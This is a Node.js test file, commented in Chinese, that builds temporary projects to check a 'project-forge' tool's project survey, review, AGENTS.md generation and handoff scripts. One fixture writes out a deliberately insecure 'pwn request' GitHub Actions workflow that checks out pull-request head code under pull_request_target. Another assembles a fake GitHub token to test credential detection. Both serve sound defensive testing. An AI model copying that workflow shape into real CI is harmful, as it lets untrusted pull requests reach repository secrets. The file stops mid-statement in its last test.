#!/usr/bin/env node
/**
 * fixtures.mjs —— 行为断言：造临时项目实跑，确认判定没写错。
 *
 * 结构自检查不出「判定写错了」：勘察把一个 CMake 项目判成纯文档目录时，
 * 引用与格式全都正常。这类错误只能靠**造出能证伪它的 fixture** 发现——
 * 一个该被判成 X 的目录，和一个容易被误判成 X 的目录。
 *
 * 只覆盖「判错了会给出错的动作」的那些判定。风格偏好不测。
 */

import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { spawn, spawnSync } from 'node:child_process'

const HERE = dirname(fileURLToPath(import.meta.url))
const SCRIPTS = resolve(HERE, '..')
const SKILL_ROOT = resolve(HERE, '..', '..')

let passed = 0
const failures = []

function check(name, fn) {
  try {
    const outcome = fn()
    if (outcome === true || outcome === undefined) { passed += 1; return }
    failures.push(`${name} —— ${outcome}`)
  } catch (error) {
    failures.push(`${name} —— 抛异常：${error instanceof Error ? error.message : String(error)}`)
  }
}

function tmpProject(files) {
  const dir = mkdtempSync(join(tmpdir(), 'pf-fix-'))
  for (const [rel, content] of Object.entries(files)) {
    const full = join(dir, rel)
    mkdirSync(dirname(full), { recursive: true })
    writeFileSync(full, content)
  }
  return dir
}

/**
 * 删掉一个临时项目。
 *
 * Windows 上刚被 git 或子进程碰过的目录会被锁一小会儿，第一次删不掉很正常。
 * 删不掉**不是测试失败**：把清理动作的失败读成判据失败，等于让一次系统抖动
 * 把一整趟行为断言打成红——而红的那一条与它要证明的东西毫无关系。
 */
function rmTree(dir) {
  try {
    rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
  } catch { /* 留给系统清理 */ }
}

/** kept 里有没有「属于某个 pid」的那一项。 */
function existingKept(result, pid) {
  return (result.kept ?? []).some((p) => p.endsWith(`.tmp-${pid}`))
}

function gitInit(dir) {
  const opts = { cwd: dir, encoding: 'utf8', stdio: 'ignore' }
  spawnSync('git', ['init', '-q'], opts)
  spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'add', '-A'], opts)
  spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'init'], opts)
}

async function survey(dir) {
  const { survey: run } = await import('../survey.mjs')
  return run(dir)
}

/**
 * 缺口与提问是 `{id, text}` 而不是纯字符串：断言要读**文字**时用这个。
 *
 * 直接对本体的 `text` 跑正则，复刻的是「缺口的形状」，判据一改（比如换成
 * id 表达）这里就全部失效，而失效的样子是「断言红了，判据其实没坏」。
 */
const { textsOf } = await import('../survey.mjs')

/** 某个目录下的 `.md` 文件名（相对 skill 根）。给「全仓库扫一遍」那类断言用。 */
function readDirRefs(dir) {
  const prefix = dir.slice(SKILL_ROOT.length + 1).replace(/\\/g, '/')
  try {
    return readdirSync(dir).filter((n) => n.endsWith('.md')).map((n) => `${prefix}/${n}`)
  } catch { return [] }
}

async function runNode(script, args) {
  return spawnSync(process.execPath, [join(SCRIPTS, script), ...args], { encoding: 'utf8', timeout: 60000 })
}

// ── 勘察：生态判定 ──────────────────────────────────────────────────

const cases = []

cases.push(['node 项目被判成 node', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0","scripts":{"test":"node --test"}}' })
  try {
    const f = await survey(dir)
    if (!f.ecosystem.kinds.includes('node')) return `kinds=${f.ecosystem.kinds}`
    if (f.commands.test !== 'npm test') return `test 命令是 ${f.commands.test}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['CMake 项目被判成 cpp，不是 docs-only', async () => {
  const dir = tmpProject({ 'CMakeLists.txt': 'cmake_minimum_required(VERSION 3.20)\nproject(x CXX)\n' })
  try {
    const f = await survey(dir)
    if (!f.ecosystem.kinds.includes('cpp')) return `kinds=${f.ecosystem.kinds}`
    if (f.ecosystem.kinds.includes('docs-only')) return '同时被判成 docs-only'
    if (f.maturity !== 'greenfield') return `maturity=${f.maturity}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['纯 md 但没 README 判成 unknown，不是 docs-only', async () => {
  const dir = tmpProject({ 'notes.md': '# 随手记\n' })
  try {
    const f = await survey(dir)
    if (f.ecosystem.kinds.includes('docs-only')) return '被误判成 docs-only'
    if (!f.ecosystem.kinds.includes('unknown')) return `kinds=${f.ecosystem.kinds}`
    if (!textsOf(f.questions).some((q) => /什么项目/.test(q))) return '没问用户这是什么项目'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['README + 只有 md 判成 docs-only', async () => {
  const dir = tmpProject({ 'README.md': '# 手册\n\n内容。\n', 'guide.md': '# 指南\n' })
  try {
    const f = await survey(dir)
    if (!f.ecosystem.kinds.includes('docs-only')) return `kinds=${f.ecosystem.kinds}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['能力目录：frontmatter 缺 description 时判为不合法', async () => {
  const dir = tmpProject({ 'SKILL.md': '---\nname: demo-skill\n---\n\n# demo\n' })
  try {
    const f = await survey(dir)
    if (!f.ecosystem.kinds.includes('skill')) return `kinds=${f.ecosystem.kinds}`
    if (f.ecosystem.skillMeta.hasValidFrontmatter !== false) return '把不合法的入口判成合法'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['Go 项目：registryFree 为真且不设 publishable', async () => {
  const dir = tmpProject({ 'go.mod': 'module github.com/acme/demo\n\ngo 1.22\n' })
  try {
    const f = await survey(dir)
    if (!f.ecosystem.kinds.includes('go')) return `kinds=${f.ecosystem.kinds}`
    if (f.ecosystem.registryFree !== true) return 'registryFree 不是真'
    if (f.ecosystem.publishable === true) return 'Go 被标成需要发制品库'
    if (f.ecosystem.declaredRepo !== 'acme/demo') return `declaredRepo=${f.ecosystem.declaredRepo}`
    return true
  } finally { rmTree(dir) }
}])

// ── 勘察：git 与角色 ────────────────────────────────────────────────

cases.push(['isRepoRoot 为假时停下并问边界', async () => {
  const outer = tmpProject({ 'package.json': '{"name":"o","version":"1.0.0"}', 'sub/README.md': '# sub\n' })
  gitInit(outer)
  try {
    const f = await survey(join(outer, 'sub'))
    if (f.git.isRepoRoot !== false) return 'isRepoRoot 没判成假'
    if (!textsOf(f.gaps).some((g) => /不是仓库根|外层仓库/.test(g))) return `gaps=${JSON.stringify(f.gaps)}`
    if (!textsOf(f.questions).some((q) => /并入|单独/.test(q))) return '没问边界'
    return true
  } finally { rmTree(outer) }
}])

cases.push(['没有远端时角色是 local-only（按纯本地工作区处置，不误判为维护者）', async () => {
  const dir = tmpProject({ 'README.md': '# a\n' })
  gitInit(dir)
  try {
    const f = await survey(dir)
    if (f.git.role !== 'local-only') return `role=${f.git.role}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['有远端、无提交历史且没声明源仓库时角色是 undetermined', async () => {
  const dir = tmpProject({ 'README.md': '# a\n' })
  spawnSync('git', ['init', '-q'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/x/y.git'], { cwd: dir, stdio: 'ignore' })
  try {
    const f = await survey(dir)
    if (f.git.role !== 'undetermined') return `role=${f.git.role}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['origin 与声明源仓库不一致时是 contributor-fork', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"a","version":"1.0.0","repository":"https://github.com/upstream/real"}',
  })
  gitInit(dir)
  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/me/fork.git'], { cwd: dir, stdio: 'ignore' })
  try {
    const f = await survey(dir)
    if (f.git.role !== 'contributor-fork') return `role=${f.git.role}`
    return true
  } finally { rmTree(dir) }
}])

// ── 勘察：凭据与忽略 ────────────────────────────────────────────────

cases.push(['未忽略的 .env 判 exposed，忽略的判 ignored', async () => {
  const dir = tmpProject({ '.gitignore': '.env.local\n', 'README.md': '# a\n' })
  gitInit(dir)
  // 提交之后再写这两个文件，它们才是「未跟踪」的——之前写会被 init 一起提交进去。
  writeFileSync(join(dir, '.env'), 'TOKEN=abc\n')
  writeFileSync(join(dir, '.env.local'), 'TOKEN=abc\n')
  try {
    const f = await survey(dir)
    const byFile = Object.fromEntries(f.risks.secretFiles.map((x) => [x.file, x.status]))
    if (byFile['.env'] !== 'exposed') return `.env 状态是 ${byFile['.env']}`
    if (byFile['.env.local'] !== 'ignored') return `.env.local 状态是 ${byFile['.env.local']}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['没有版本库时敏感文件判 undetermined（没查，不是没忽略）', async () => {
  const dir = tmpProject({ '.gitignore': '.env.local\n', '.env.local': 'TOKEN=abc\n', 'README.md': '# a\n' })
  try {
    const f = await survey(dir)
    const hit = f.risks.secretFiles.find((x) => x.file === '.env.local')
    if (!hit) return '没扫到这个文件'
    if (hit.status !== 'undetermined') return `status=${hit.status}`
    if (textsOf(f.gaps).some((g) => /未忽略的敏感文件/.test(g))) return '把它报成了未忽略的缺口'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['已入库的凭据形状判 tracked', async () => {
  // **夹具里的凭据形状在运行时拼出来**，源码里不留字面量。
  // 留了的话，这个仓库自己的交付体检会把 fixtures.mjs 报成「凭据已进版本库」——
  // 那条判据是对的，错的是把假凭据当成源码写进去。
  const fake = `ghp_${'abcdefghijklmnopqrstuvwxyz0123456789'}`
  const dir = tmpProject({ 'config.js': `const k = "${fake}"\n` })
  gitInit(dir)
  try {
    const f = await survey(dir)
    const hit = f.risks.secretContent.find((c) => c.file === 'config.js')
    if (!hit) return '没扫到凭据形状'
    if (hit.status !== 'tracked') return `status=${hit.status}`
    if (!hit.line) return '没给行号'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['未忽略的 node_modules 判成缺口', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0"}', 'node_modules/x/i.js': '1\n' })
  gitInit(dir)
  try {
    const f = await survey(dir)
    if (!f.ignores.unignoredOutputDirs.includes('node_modules')) {
      return `unignoredOutputDirs=${JSON.stringify(f.ignores.unignoredOutputDirs)}`
    }
    return true
  } finally { rmTree(dir) }
}])

// ── 门禁：结论与提示 ────────────────────────────────────────────────

cases.push(['没有 CI 时提示的 flag 键必须是 no-ci（文案漂移回归）', async () => {
  const dir = tmpProject({ 'README.md': '# a\n\n一个小项目，说明足够长以通过长度检查。\n', 'package.json': '{"name":"a","version":"1.0.0"}' })
  try {
    const r = await runNode('review.mjs', [dir, '--json'])
    const data = JSON.parse(r.stdout)
    const item = data.results.find((x) => x.id === 'ci.absent')
    if (!item) return '没有 ci.absent 这一条'
    if (item.decision !== 'no-ci') return `decision=${item.decision}`
    if (item.level !== 'notice') return `level=${item.level}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['有远端但缺 PR 模板时提示的键是 no-collab-templates（文案漂移回归）', async () => {
  const dir = tmpProject({ 'README.md': '# a\n\n说明足够长以通过长度检查，内容真实。\n' })
  gitInit(dir)
  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/x/y.git'], { cwd: dir, stdio: 'ignore' })
  try {
    const r = await runNode('review.mjs', [dir, '--json'])
    const data = JSON.parse(r.stdout)
    const item = data.results.find((x) => x.id === 'collab.pr-template')
    if (!item) return '没有 collab.pr-template 这一条'
    if (item.decision !== 'no-collab-templates') return `decision=${item.decision}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['LICENSE 相关的指路指向 docs-set.md 的「LICENSE」节（章节号漂移回归）', async () => {
  const dir = tmpProject({ 'README.md': '# a\n\n说明足够长以通过长度检查，内容真实。\n', 'package.json': '{"name":"a","version":"1.0.0","license":"MIT"}' })
  try {
    const r = await runNode('review.mjs', [dir, '--json'])
    const data = JSON.parse(r.stdout)
    const item = data.results.find((x) => x.id === 'license.publishable')
    if (!item) return '没有 license.publishable 这一条'
    if (!item.ref || item.ref.file !== 'references/docs-set.md') return `ref=${JSON.stringify(item.ref)}`
    // 断言「指到 LICENSE 那一节」，而不是「指到第几节」：节号会随增删章节失效，
    // 标题不会。preflight 另有一条判据核对这个标题真的存在。
    if (!/LICENSE/.test(item.ref.section)) return `section=${item.ref.section}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['pwn request 形状判 [缺]，只用了触发器但没检出提案代码则放行', async () => {
  const bad = tmpProject({
    'README.md': '# a\n',
    '.github/workflows/ci.yml': 'on: pull_request_target\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n',
  })
  const good = tmpProject({
    'README.md': '# a\n',
    '.github/workflows/ci.yml': 'on: pull_request_target\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo label\n',
  })
  try {
    const rb = JSON.parse((await runNode('review.mjs', [bad, '--json'])).stdout)
    const rbm = rb.results.find((x) => x.id === 'ci.pwn-request')
    if (!rbm || rbm.level !== 'missing') return `危险形状被判成 ${rbm && rbm.level}`
    const rg = JSON.parse((await runNode('review.mjs', [good, '--json'])).stdout)
    const rgm = rg.results.find((x) => x.id === 'ci.pwn-request')
    if (rgm) return `合法用法被误报成 ${rgm.level}`
    return true
  } finally {
    rmTree(bad)
    rmTree(good)
  }
}])

cases.push(['「## 取舍」里表过态的决定不再报 [待定]', async () => {
  const dir = tmpProject({
    'README.md': '# a\n\n说明足够长以通过长度检查，内容真实。\n',
    'AGENTS.md': '# a\n\n## 取舍\n\n- `license`：不放，个人项目\n- `no-ci`：不配\n',
  })
  try {
    const r = JSON.parse((await runNode('review.mjs', [dir, '--json'])).stdout)
    const license = r.results.find((x) => x.id === 'license.missing')
    if (!license) return '没有 license.missing 这一条'
    if (license.level !== 'ok') return `表态后仍是 ${license.level}`
    const ci = r.results.find((x) => x.id === 'ci.absent')
    if (ci && ci.level !== 'ok') return `no-ci 表态后仍是 ${ci.level}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['CLI 上不再有 --remember / --no-* 这类开关', async () => {
  const r = await runNode('review.mjs', ['--help'])
  for (const bad of ['--remember', '--forget', '--no-ci', '--no-bilingual', '--pr-template-kept']) {
    if ((r.stdout || '').includes(bad)) return `help 里还有 ${bad}`
  }
  return true
}])

// ── 生成：标记与幂等 ────────────────────────────────────────────────

cases.push(['生成后在目标项目里零侵入：没有隐藏目录、没有拷进来的脚本', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0","private":true}' })
  try {
    await runNode('compose-agents.mjs', [dir])
    if (existsSync(join(dir, '.project-forge'))) return '留下了 .project-forge/'
    if (existsSync(join(dir, 'scripts'))) return '留下了 scripts/'
    const agents = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const nonMarker = agents.split('\n').filter((l) => l.includes('project-forge') && !/project-forge:\s*(begin|end|fill)/.test(l))
    if (nonMarker.length > 0) return `非标记行里出现了 project-forge：${nonMarker[0]}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['手写的 AGENTS.md 不被改动', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"a","version":"1.0.0"}',
    'AGENTS.md': '# 我手写的\n\n## 项目定位\n\n这是我自己写的，别动。\n',
  })
  try {
    const before = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    await runNode('compose-agents.mjs', [dir])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (before !== after) return '手写文件被改了'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['连跑三次 compose，第二次起字节不变（幂等）', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0","scripts":{"test":"node --test"}}' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const h1 = readFileSync(join(dir, 'AGENTS.md'))
    await runNode('compose-agents.mjs', [dir])
    const h2 = readFileSync(join(dir, 'AGENTS.md'))
    await runNode('compose-agents.mjs', [dir])
    const h3 = readFileSync(join(dir, 'AGENTS.md'))
    if (!h1.equals(h2) || !h2.equals(h3)) return '第二遍或第三遍改了文件'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['未填占位时 --check 红；填完删掉标记后转绿', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0"}' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const c1 = await runNode('compose-agents.mjs', [dir, '--check'])
    if (c1.status === 0) return '未填占位时 --check 放行了'
    const filled = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      .replace(/<!-- project-forge: fill [^>]*-->/g, '已填写。')
    writeFileSync(join(dir, 'AGENTS.md'), filled)
    const c2 = await runNode('compose-agents.mjs', [dir, '--check'])
    if (c2.status !== 0) return `填完之后 --check 仍红：${(c2.stderr || '').trim().split('\n')[0]}`
    return true
  } finally { rmTree(dir) }
}])

// ── 交棒 ────────────────────────────────────────────────────────────

cases.push(['handoff 扫得到标记，剥掉之后判干净', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0"}' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const h1 = await runNode('handoff.mjs', [dir, '--verify'])
    if (h1.status === 0) return '还有标记时 --verify 说干净'
    await runNode('compose-agents.mjs', [dir, '--clean'])
    const h2 = await runNode('handoff.mjs', [dir, '--verify'])
    if (h2.status !== 0) return '剥掉标记后 --verify 仍说脏'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['handoff 不动手：--scan 前后项目字节完全一致', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0"}' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const before = readFileSync(join(dir, 'AGENTS.md'))
    await runNode('handoff.mjs', [dir, '--scan'])
    const after = readFileSync(join(dir, 'AGENTS.md'))
    if (!before.equals(after)) return '--scan 改了文件'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['handoff 认得出旧版留下的账本目录', async () => {
  const dir = tmpProject({ 'README.md': '# a\n', '.project-forge/ledger.json': '{"version":1}\n' })
  try {
    const r = await runNode('handoff.mjs', [dir, '--json'])
    const data = JSON.parse(r.stdout)
    if (!data.legacyPaths.some((p) => p.path === '.project-forge')) return '没报出旧版账本目录'
    if (data.clean === true) return '有旧版残留却判成干净'
    return true
  } finally { rmTree(dir) }
}])

// ── 生成：占位符与条件块 ────────────────────────────────────────────

cases.push(['没有命令的项目：产物里没有残留占位符，且留了要人填的位', async () => {
  const dir = tmpProject({ 'README.md': '# 手册\n\n一个纯文档项目，说明足够长。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const agents = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    // 反面：占位符原样留在用户文件里。它看起来像「这里本来就该有一段命令」，
    // 于是没人发现，直到有人照着它去找命令。
    const leftover = [...agents.matchAll(/\{\{[A-Z0-9_]+\}\}/g)].map((m) => m[0])
    if (leftover.length > 0) return `产物里还有未替换的占位符：${leftover.join('、')}`
    if (!/project-forge:\s*fill 构建与验证命令/.test(agents)) return '没有留下「构建与验证命令」的待填位'
    // 条件块必须一个都不剩：它回答的是「这个项目该不该有这一节」，那个问题在生成时就答完了。
    if (/project-forge:\s*(?:if|endif)/.test(agents)) return '产物里还有 if/endif 条件块'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['有命令的项目：命令写进产物，且不再留占位', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0","scripts":{"test":"node --test"}}' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const agents = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!agents.includes('npm test')) return '产物里没有探到的测试命令'
    if (/project-forge:\s*fill 构建与验证命令/.test(agents)) return '有命令了还留着「还没声明命令」的待填位'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['多生态项目：两套命令都在产物里，不只留一份', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"web","version":"1.0.0","private":true,"scripts":{"test":"node --test"}}',
    'pyproject.toml': '[project]\nname = "api"\nversion = "1.0.0"\n',
    // 后端也给一份测试证据：命令只按**项目里真实存在的东西**给，不按生态惯例编。
    'tests/test_api.py': 'def test_ok():\n    assert True\n',
  })
  try {
    const f = await survey(dir)
    const buckets = Object.keys(f.commandsByEcosystem ?? {})
    if (!buckets.includes('node') || !buckets.includes('python')) return `commandsByEcosystem=${buckets.join(',')}`
    await runNode('compose-agents.mjs', [dir])
    const agents = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!agents.includes('npm test')) return '产物里没有前端命令'
    if (!agents.includes('pytest')) return '产物里没有后端命令——只测一半的 CI 看起来完全正常'
    if (!/^# --- node ---$/m.test(agents) || !/^# --- python ---$/m.test(agents)) return '多生态命令没有按生态分段'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['受管区间被手删之后，重跑会把它补回来，且填过的人工内容不动', async () => {
  const dir = tmpProject({ 'README.md': '# a\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const first = readFileSync(join(dir, 'AGENTS.md'), 'utf8')

    // 填掉项目定位，模拟维护者读过并写过了。
    const filled = first.replace(
      /<!-- project-forge: begin 项目定位 -->\n## 项目定位\n\n[\s\S]*?<!-- project-forge: end 项目定位 -->/,
      '<!-- project-forge: begin 项目定位 -->\n## 项目定位\n\n我手写的定位，一个字都不许动。\n<!-- project-forge: end 项目定位 -->',
    )
    // 再把「高风险路径」整段删掉，模拟一份来自更早模板的文件。
    const trimmed = filled.replace(
      /<!-- project-forge: begin 高风险路径 -->[\s\S]*?<!-- project-forge: end 高风险路径 -->\n*/,
      '',
    )
    if (/begin 高风险路径/.test(trimmed)) throw new Error('夹具没删掉那一节')
    writeFileSync(join(dir, 'AGENTS.md'), trimmed)
    writeFileSync(join(dir, 'package.json'), '{"name":"a","version":"1.0.0","scripts":{"test":"node --test"}}')

    await runNode('compose-agents.mjs', [dir])
    const second = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!second.includes('我手写的定位，一个字都不许动。')) return '填过的项目定位被覆盖了'
    if (!/project-forge: begin 高风险路径/.test(second)) return '缺的受管区间没有被补回来'
    if (!second.includes('npm test')) return '新出现的测试命令没有被写进契约'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['手写 AGENTS.md --upgrade：补齐核心节，原节一字未动，不重复追加同义节', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"a","version":"1.0.0"}',
    'AGENTS.md': '# a\n\n## 项目定位\n\n手写的。\n\n## 构建与测试\n\n自己那套。\n',
  })
  try {
    const before = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    await runNode('compose-agents.mjs', [dir, '--upgrade'])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!after.startsWith(before.trimEnd())) return '原有内容被改动了（--upgrade 只许追加）'
    if (!/## 架构与关键不变量/.test(after)) return '没有补上「架构与关键不变量」'
    if (!/## 高风险路径/.test(after)) return '没有补上「高风险路径」'
    // 「## 构建与测试」与模板的「构建与验证」是同一件事：按标题名精确匹配会导致
    // 整节被重复追加一遍，而重复的那节通常没人读，两份内容从此各自漂移。
    const buildHits = (after.match(/^##\s+(?:环境与)?构建与(?:验证|测试)/gm) ?? []).length
    if (buildHits > 1) return `「构建与验证」被追加了 ${buildHits} 份——同义标题没有认出来`
    return true
  } finally { rmTree(dir) }
}])

// ── 风险：本机路径分类 ──────────────────────────────────────────────

cases.push(['测试夹具里的本机路径判 test-data，源码里的同一条判 leak', async () => {
  const { homedir: home } = await import('node:os')
  const leak = `${home()}${home().includes('\\') ? '\\' : '/'}secret-config`
  const dir = tmpProject({
    'tests/fixture.txt': `path=${leak}\n`,
    'src/config.js': `const p = "${leak}"\n`,
    'README.md': '# a\n',
  })
  try {
    const f = await survey(dir)
    const byFile = Object.fromEntries(f.risks.homePathLeaks.map((x) => [x.file, x.category]))
    if (byFile['tests/fixture.txt'] !== 'test-data') return `tests/fixture.txt 判成 ${byFile['tests/fixture.txt']}`
    if (byFile['src/config.js'] !== 'leak') return `src/config.js 判成 ${byFile['src/config.js']}`
    const r = JSON.parse((await runNode('review.mjs', [dir, '--json'])).stdout)
    const hit = r.results.find((x) => x.id === 'secrets.home-paths')
    if (!hit) return '体检没报真泄露'
    if (hit.title.includes('tests/fixture.txt')) return '体检把测试夹具报成了泄露——修它的人会先去改掉那份有用的夹具'
    return true
  } finally { rmTree(dir) }
}])

// ── 发布：标签形状 ──────────────────────────────────────────────────

cases.push(['插件项目打了带 v 的标签判 [缺]，裸版本号放行', async () => {
  const files = {
    'package.json': '{"name":"demo","version":"1.0.0"}',
    'manifest.json': '{"id":"demo","name":"Demo","version":"1.0.0","minAppVersion":"1.0.0"}\n',
    'README.md': '# a\n\n说明足够长以通过长度检查。\n',
  }
  const bad = tmpProject(files)
  const good = tmpProject(files)
  try {
    gitInit(bad)
    spawnSync('git', ['tag', 'v1.0.0'], { cwd: bad, stdio: 'ignore' })
    const rb = JSON.parse((await runNode('review.mjs', [bad, '--json'])).stdout)
    const hit = rb.results.find((x) => x.id === 'release.observed-v-tag')
    if (!hit || hit.level !== 'missing') return `带 v 的标签被判成 ${hit && hit.level}`

    gitInit(good)
    spawnSync('git', ['tag', '1.0.0'], { cwd: good, stdio: 'ignore' })
    const rg = JSON.parse((await runNode('review.mjs', [good, '--json'])).stdout)
    const falsePositive = rg.results.find((x) => x.id === 'release.observed-v-tag')
    if (falsePositive) return `裸版本号被误报成 ${falsePositive.level}`
    return true
  } finally {
    rmTree(bad)
    rmTree(good)
  }
}])

// ── 交棒：退出码三档 ────────────────────────────────────────────────

cases.push(['handoff 的 --verify 干净退出 0，有痕迹退出 1', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0"}' })
  try {
    const clean = await runNode('handoff.mjs', [dir, '--verify'])
    if (clean.status !== 0) return `本来就干净却退出 ${clean.status}`
    await runNode('compose-agents.mjs', [dir])
    const dirty = await runNode('handoff.mjs', [dir, '--verify'])
    if (dirty.status !== 1) return `有痕迹却退出 ${dirty.status}（1 才是「还有东西」）`
    return true
  } finally { rmTree(dir) }
}])

// ── 围栏里的标记：不能当标记，也不能当「已填」 ────────────────────

cases.push(['围栏里的 fill 不算数：--check 与 handoff 数到的一样多，且不会冲掉人填的内容', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n纯文档项目，说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const agents = readFileSync(join(dir, 'AGENTS.md'), 'utf8')

    // 三处必须给出同一个数：文件里肉眼能数到的、--check 报的、handoff 认到的。
    // 三处不一致的后果是这一条：用户填完之后 --check 绿了，再跑一次生成又被冲回占位。
    const rawCount = (agents.match(/project-forge:\s*fill/g) ?? []).length
    const check = await runNode('compose-agents.mjs', [dir, '--check'])
    const checkCount = Number((/还有 (\d+) 处未填/.exec(check.stderr) ?? [])[1])
    const handoff = JSON.parse((await runNode('handoff.mjs', [dir, '--json'])).stdout)
    if (checkCount !== rawCount) return `--check 报 ${checkCount} 处，文件里有 ${rawCount} 处`
    if (handoff.placeholders.length !== rawCount) return `handoff 认到 ${handoff.placeholders.length} 处，文件里有 ${rawCount} 处`

    // 用真实的填法：删掉整行 fill 标记，在代码块里写命令。再跑一次不能把它冲掉。
    const filled = agents.replace(
      /^<!-- project-forge: fill 构建与验证命令[^\n]*-->$/m,
      'node --test  # 测试',
    )
    writeFileSync(join(dir, 'AGENTS.md'), filled)
    await runNode('compose-agents.mjs', [dir])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!after.includes('node --test  # 测试')) return '人填的命令被刷新冲掉了'
    if (after.includes('填这个项目真实的构建')) return '该节被冲回了占位'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['插入的新节按模板顺序排，不颠倒', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    // 把前两节删掉，模拟一份来自更早模板的文件。
    let text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    for (const id of ['项目定位', '架构与关键不变量']) {
      text = text.replace(new RegExp(`<!-- project-forge: begin ${id} -->[\\s\\S]*?<!-- project-forge: end ${id} -->\\n*`), '')
    }
    writeFileSync(join(dir, 'AGENTS.md'), text)
    await runNode('compose-agents.mjs', [dir])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const order = [...after.matchAll(/^##\s+(.+)$/gm)].map((m) => m[1])
    const posProject = order.findIndex((h) => h.includes('项目定位'))
    const posArch = order.findIndex((h) => h.includes('架构'))
    if (posProject < 0 || posArch < 0) return `补回来的节不齐：${order.join(' | ')}`
    if (posProject > posArch) return `顺序反了：项目定位在第 ${posProject} 位，架构在第 ${posArch} 位`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['同义标题：带编号的认得出、泛指的「验证流程」不算构建节、正文里提到也不算已有', async () => {
  const dir = tmpProject({ 'package.json': '{"name":"a","version":"1.0.0"}' })
  try {
    const cases = [
      // 带编号的标题必须认出来，否则已有节会被重复追加
      { body: '# a\n\n## 1. 项目定位\n\n手写。\n\n## 2. 构建与验证\n\n手写命令。\n', expect: 'no-dup-build' },
      // 「验证流程」讲的是审查流程，不是构建命令；构建节必须补进来
      { body: '# a\n\n## 项目定位\n\n手写。\n\n## 验证流程\n\n讲审查流程的。\n', expect: 'need-build' },
      // 正文里偶然提到那几个字，不等于已经有那一节
      { body: '# a\n\n## 项目定位\n\n手写。\n\n正文里顺口提到一句构建与验证的事。\n', expect: 'need-build' },
    ]
    for (const c of cases) {
      writeFileSync(join(dir, 'AGENTS.md'), c.body)
      await runNode('compose-agents.mjs', [dir, '--upgrade'])
      const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      // 构建节的标题可能叫「构建与验证」或「环境与构建验证」，判据是它同时含这两个词。
      const buildHits = [...after.matchAll(/^##\s+.*$/gm)]
